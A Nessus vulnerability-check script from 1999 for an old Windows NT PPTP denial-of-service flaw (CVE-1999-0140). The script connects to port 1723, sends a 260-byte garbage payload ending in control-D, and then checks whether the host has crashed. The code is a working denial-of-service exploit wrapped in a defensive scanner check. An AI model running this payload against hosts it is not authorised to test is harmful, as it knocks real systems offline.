#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10313);
 script_bugtraq_id(2111);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-1999-0140");
 
 name["english"] = "WindowsNT PPTP flood denial";
 name["francais"] = "WindowNT PPTP flood denial";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
We could make the remote PPTP host crash
by telnetting to port 1723, and sending
garbage followed by the character ^D.
(control-d).

An attacker may use this flaw to prevent this host
from working properly and making it reboot
more often than usual.

Solution : Install WindowsNT SP5.

Risk factor : High";


 desc["francais"] = "
Il s'est avéré possible de faire planter
la machine distante en s'y connectant au
port 1723 et en lui envoyant de nombreuses
données suivies du caractère ^D (controle-d).

Un pirate peut utiliser ce problème pour
faire planter la machine distante plus
que d'habitude, l'empechant ainsi de
fonctionner correctement.

Solution : Installez WindowsNT SP5.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote server";
 summary["francais"] = "Fait planter le serveur distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(1723);
 exit(0);
}

#
# The script code starts here
#

port = 1723;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  
  # Ping the host _before_
  
  start_denial();
  
  # Send the garbage
  
  c = crap(260);
  c[256]=raw_string(10);
  c[257]=raw_string(4);
  c[258]=0;
  send(socket:soc, data:c, length:259);
  close(soc);
  

  
  # Is is dead ?
  alive = end_denial();
  if(!alive){
  		security_hole(port);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
 }
}
